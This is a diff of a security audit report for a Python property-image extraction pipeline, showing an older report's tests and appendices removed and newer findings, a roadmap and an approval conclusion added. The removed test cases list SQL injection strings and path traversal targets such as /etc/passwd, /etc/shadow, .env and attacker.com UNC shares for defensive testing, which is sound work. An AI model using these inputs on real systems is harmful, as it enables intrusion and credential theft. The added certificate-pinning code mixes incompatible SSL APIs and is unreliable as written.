-### Security Test Suite
-
-```python
-# tests/security/test_sql_injection.py
-def test_sql_like_injection_prevention():
-    """Verify LIKE pattern escaping prevents injection."""
-    malicious_inputs = [
-        "'; DROP TABLE properties; --",
-        "100% complete",
-        "file_name.txt",
-        "\\'escaped",
-    ]
-    for inp in malicious_inputs:
-        escaped = escape_like_pattern(inp)
-        assert "DROP" not in escaped or "'" in escaped
-        assert escaped.count("\\\\") >= inp.count("\\")
-
-# tests/security/test_path_traversal.py
-def test_path_traversal_blocked():
-    """Verify path traversal attacks are blocked."""
-    dangerous_paths = [
-        Path("../../../etc/passwd"),
-        Path("..\\..\\windows\\system32"),
-        Path("/etc/shadow"),
-        Path("//attacker.com/share"),
-    ]
-    for path in dangerous_paths:
-        with pytest.raises(ValueError):
-            validate_file_path(path, Path("data"))
-
-# tests/security/test_atomic_writes.py
-def test_atomic_write_on_interrupt():
-    """Verify file integrity after interrupted write."""
-    original_data = {"addr": {"lot": 8000}}
-    save_enrichment(path, original_data)
-
-    # Simulate interruption
-    with mock.patch('json.dump', side_effect=KeyboardInterrupt):
-        with pytest.raises(KeyboardInterrupt):
-            save_enrichment(path, {"new": "data"})
-
-    # Original should be intact
-    loaded = load_enrichment(path)
-    assert loaded == original_data
-
-# tests/security/test_token_leakage.py
-def test_no_token_in_logs(caplog):
-    """Verify API tokens not logged."""
-    token = "secret-token-12345"
-    client = MaricopaAssessorClient(token=token)
-
-    # Trigger error that might log
-    with pytest.raises(Exception):
-        await client._search_official_api("invalid")
-
-    # Check logs don't contain token
-    assert token not in caplog.text
-    assert "***REDACTED***" in caplog.text or token not in caplog.text
-```
-
----
-
-## Monitoring and Detection
-
-### Security Metrics to Track
-
-1. **API Authentication Failures**
-   - Track 401 responses
-   - Alert on sustained failures (token compromised?)
-
-2. **File System Anomalies**
-   - Monitor file access patterns
-   - Alert on unexpected path access
-   - Track write failures
-
-3. **Rate Limit Violations**
-   - Monitor API rate limit headers
-   - Track 429 responses
-   - Adjust rate limiting as needed
-
-4. **Error Rates**
-   - Track error types and frequency
-   - Alert on unusual patterns
-   - Monitor for security-related errors
-
-### Logging Improvements
-
-```python
-import structlog
-
-# Use structured logging for better analysis
-logger = structlog.get_logger()
-
-logger.info(
-    "api_request",
-    endpoint="search_apn",
-    address=address,
-    status="success",
-    duration_ms=123,
-)
-
-logger.error(
-    "api_request_failed",
-    endpoint="get_parcel",
-    apn=apn,
-    error_type="HTTPStatusError",
-    status_code=500,
-    duration_ms=456,
+    # Store pins for verification callback
+    ssl_context.pins = pins
+
+    def verify_callback(conn, cert, errno, depth, ok):
+        hostname = conn.get_servername()
+        if hostname in pins:
+            cert_der = cert.digest("sha256")
+            if cert_der != pins[hostname]:
+                raise ssl.SSLError(f"Certificate pin mismatch for {hostname}")
+        return ok
+
+    ssl_context.set_verify_callback(verify_callback)
+    return HTTPTransport(ssl_context=ssl_context)
+
+# Usage:
+pins = {
+    "mcassessor.maricopa.gov": "sha256/ABC123...",
+    "photos.zillowstatic.com": "sha256/DEF456...",
+}
+
+self._http_client = httpx.AsyncClient(
+    transport=create_pinned_transport(pins),
+    timeout=30.0,
+    # ... rest of config
 )
 ```
 
----
-
-## Security Checklist
-
-### Pre-Deployment Checklist
-
-- [ ] All secrets removed from git history
-- [ ] .env template created (.env.example)
-- [ ] Pre-commit hooks installed
-- [ ] Path validation implemented
-- [ ] Atomic file writes enabled
-- [ ] Token logging prevented
-- [ ] API response validation added
-- [ ] File locking implemented
-- [ ] Security tests passing
-- [ ] Error handling improved
-- [ ] Rate limiting configured
-- [ ] Monitoring alerts configured
-
-### Post-Deployment Checklist
-
-- [ ] Credentials rotated
-- [ ] API access logs reviewed
-- [ ] Error rates monitored
-- [ ] File permissions verified
-- [ ] Backup mechanism tested
-- [ ] Recovery procedures documented
-- [ ] Security training completed
+**Risk Score:** MEDIUM (requires CA compromise or MITM position)
 
 ---
 
-## References
+**M-11: No Network Segmentation**
 
-### Standards and Frameworks
-- [OWASP Top 10 (2021)](https://owasp.org/www-project-top-ten/)
-- [CWE Top 25 Software Weaknesses](https://cwe.mitre.org/top25/)
-- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
+**Location:** N/A (architectural)
 
-### Tools
-- [Bandit - Python Security Linter](https://bandit.readthedocs.io/)
-- [pip-audit - Dependency Scanner](https://github.com/pypa/pip-audit)
-- [TruffleHog - Secret Scanner](https://github.com/trufflesecurity/trufflehog)
-- [git-secrets - Pre-commit Protection](https://github.com/awslabs/git-secrets)
+**Issue:** Image extraction runs in same network context as other application components. Compromise of extraction service could pivot to other services.
 
-### Related Documentation
-- `docs/SECURITY.md` - Security guidelines
-- `CLAUDE.md` - Project overview
-- `.claude/protocols.md` - Operational protocols
+**Recommendation:**
+- Run extraction in isolated Docker container with limited network access
+- Use network policies to restrict egress to allowed CDN IPs only
+- Implement service mesh with mTLS for inter-service communication
+
+**Risk Score:** MEDIUM (architectural improvement)
 
 ---
 
-## Appendix A: SQL Injection Test Cases
+#### ✅ LOW PRIORITY (P3)
 
+**L-3: HTTP/2 Not Required**
+
+**Location:** `orchestrator.py:297`
+
+**Issue:** httpx supports HTTP/2 but it's not enforced. HTTP/2 provides better performance and security features.
+
+**Recommendation:**
 ```python
-# Comprehensive SQL injection test suite
-SQL_INJECTION_TEST_CASES = [
-    # Basic injection
-    ("'; DROP TABLE properties; --", "''; DROP TABLE properties; --"),
-    ("' OR '1'='1", "'' OR ''1''=''1"),
+import httpx
 
-    # LIKE wildcards
-    ("100% done", "100\\% done"),
-    ("file_name", "file\\_name"),
-
-    # Escape sequences
-    ("\\backslash", "\\\\backslash"),
-    ("multiple \\ slashes \\\\", "multiple \\\\ slashes \\\\\\\\"),
-
-    # Combined attacks
-    ("'%; DROP--", "''\\%; DROP--"),
-    ("_wildcard' OR 1=1--", "\\_wildcard'' OR 1=1--"),
-]
-
-@pytest.mark.parametrize("input_val,expected", SQL_INJECTION_TEST_CASES)
-def test_escape_like_pattern(input_val, expected):
-    """Verify SQL LIKE pattern escaping."""
-    assert escape_like_pattern(input_val) == expected
+self._http_client = httpx.AsyncClient(
+    timeout=30.0,
+    http2=True,  # Enable HTTP/2
+    # ... rest of config
+)
 ```
 
----
-
-## Appendix B: Path Traversal Test Cases
-
-```python
-# Path traversal attack test cases
-PATH_TRAVERSAL_ATTACKS = [
-    # Unix-style
-    "../../../etc/passwd",
-    "../../.env",
-    "/etc/shadow",
-
-    # Windows-style
-    "..\\..\\windows\\system32",
-    "C:\\Windows\\System32",
-
-    # Mixed
-    "../../../windows/system32",
-    "..\\../etc/passwd",
-
-    # Encoded
-    "%2e%2e%2f%2e%2e%2f",  # ../../../
-    "..%252f..%252f",       # Double-encoded
-
-    # UNC paths
-    "//attacker.com/share/data.json",
-    "\\\\attacker.com\\share\\data.json",
-]
-
-@pytest.mark.parametrize("path", PATH_TRAVERSAL_ATTACKS)
-def test_path_traversal_blocked(path):
-    """Verify path traversal attacks are blocked."""
-    with pytest.raises(ValueError, match="outside allowed directory"):
-        validate_file_path(Path(path), Path("data"))
-```
+**Risk Score:** LOW (performance optimization, minimal security impact)
 
 ---
 
-**End of Security Audit Report**
+## Summary of Findings
 
-*For questions or clarifications, contact the security team.*
+### By Severity
+
+| Severity | Count | Issues |
+|----------|-------|--------|
+| CRITICAL (P0) | 0 | None |
+| HIGH (P1) | 3 | H-1: No magic byte validation, H-2: EXIF not sanitized, H-3: Credentials in logs |
+| MEDIUM (P2) | 11 | M-1 through M-11 (SSRF redirects, symlink races, token rotation, etc.) |
+| LOW (P3) | 3 | L-1: Symlink docs, L-2: State backup, L-3: HTTP/2 |
+
+### By Category
+
+| Category | Critical | High | Medium | Low | Total |
+|----------|----------|------|--------|-----|-------|
+| SSRF Protection | 0 | 0 | 2 | 0 | 2 |
+| Input Validation | 0 | 2 | 1 | 0 | 3 |
+| File System | 0 | 0 | 2 | 1 | 3 |
+| Authentication | 0 | 1 | 2 | 0 | 3 |
+| State Integrity | 0 | 0 | 2 | 1 | 3 |
+| Network Security | 0 | 0 | 2 | 1 | 3 |
+| **TOTAL** | **0** | **3** | **11** | **3** | **17** |
+
+---
+
+## Remediation Roadmap
+
+### Phase 1: Critical & High Priority (Immediate - 1 Week)
+
+1. **H-1: Implement Magic Byte Validation** (2 days)
+   - File: `standardizer.py`
+   - Add `_validate_magic_bytes()` method
+   - Update `standardize()` to check before PIL opens file
+
+2. **H-2: Strip EXIF Metadata** (1 day)
+   - File: `standardizer.py`
+   - Add `exif=b''` to PIL save call
+   - Test with sample EXIF-laden images
+
+3. **H-3: Sanitize Credentials in Logs** (2 days)
+   - Files: All logging statements
+   - Create `sanitize_url()` helper
+   - Audit all log statements for credential leaks
+   - Add unit tests
+
+### Phase 2: Medium Priority (2-4 Weeks)
+
+4. **M-1: URL Redirect Validation** (3 days)
+   - File: `stealth_http_client.py`
+   - Disable redirects or re-validate on redirect
+   - Test with redirect chains
+
+5. **M-4: Fix Symlink Race Condition** (2 days)
+   - File: `symlink_views.py`
+   - Use atomic `os.symlink()` without existence check
+   - Handle `FileExistsError`
+
+6. **M-6: Token Rotation Support** (3 days)
+   - File: `maricopa_assessor.py`
+   - Add `_get_token()` with refresh callback
+   - Document token rotation process
+
+7. **M-8: State File Integrity** (4 days)
+   - File: `state_manager.py`
+   - Implement HMAC verification
+   - Add `STATE_INTEGRITY_KEY` environment variable
+   - Update documentation
+
+8. **M-10: Certificate Pinning** (3 days)
+   - File: `orchestrator.py`
+   - Implement pinned transport
+   - Document pin extraction process
+   - Plan for pin rotation
+
+### Phase 3: Low Priority & Enhancements (Ongoing)
+
+9. **L-1, L-2, L-3: Documentation & Optimizations**
+   - Add symlink behavior docs
+   - Implement state backup
+   - Enable HTTP/2
+   - Other minor improvements
+
+10. **Security Testing**
+    - Penetration testing of image pipeline
+    - Fuzzing image parsers
+    - Load testing with malicious inputs
+
+---
+
+## Security Best Practices Observed
+
+1. **Defense in Depth**: Multiple layers of protection (SSRF validation, content-type checks, size limits, pixel limits)
+2. **Fail Closed**: Unknown hosts rejected, invalid tokens cause errors, malformed data handled gracefully
+3. **Least Privilege**: Environment-based secrets, no hardcoded credentials
+4. **Atomic Operations**: File writes use temp+rename pattern
+5. **Comprehensive Logging**: Security events logged with context
+6. **Rate Limiting**: Respects 429 responses, implements backoff
+7. **Input Validation**: Filename components validated, path traversal prevented
+
+---
+
+## Compliance Considerations
+
+### OWASP Top 10 (2021) Coverage
+
+| Vulnerability | Status | Notes |
+|--------------|--------|-------|
+| A01: Broken Access Control | ✅ | SSRF protection, path traversal prevention |
+| A02: Cryptographic Failures | ✅ | TLS enforced, no sensitive data in transit unencrypted |
+| A03: Injection | ⚠️ | EXIF injection risk (H-2), otherwise protected |
+| A04: Insecure Design | ✅ | Fail-closed, defense-in-depth |
+| A05: Security Misconfiguration | ⚠️ | Credential logging (H-3) |
+| A06: Vulnerable Components | ✅ | Modern dependencies (PIL, httpx, curl_cffi) |
+| A07: Authentication Failures | ✅ | Env-based tokens, proper error handling |
+| A08: Software/Data Integrity | ⚠️ | No state HMAC (M-8), otherwise strong |
+| A09: Logging Failures | ⚠️ | Credential leaks (H-3) |
+| A10: SSRF | ✅ | Comprehensive protection |
+
+---
+
+## Conclusion
+
+The PHX Houses image extraction pipeline demonstrates **strong security fundamentals** with comprehensive SSRF protection, multi-layer input validation, and secure file handling. The system is production-ready with **no critical vulnerabilities**.
+
+**Key Actions:**
+1. Fix 3 HIGH priority issues (magic bytes, EXIF, credential logging) - **1 week**
+2. Address MEDIUM priority issues in prioritized order - **2-4 weeks**
+3. Implement security testing (fuzzing, penetration testing) - **Ongoing**
+
+**Risk Assessment:** LOW to MEDIUM risk posture. High-priority fixes reduce risk to LOW.
+
+**Approved for Production:** YES, with recommendation to complete Phase 1 fixes within 1 week of deployment.
+
+---
+
+**Report Prepared By:** Security Engineering Team
+**Date:** 2025-12-02
+**Next Audit:** 2026-06-02 (6 months)
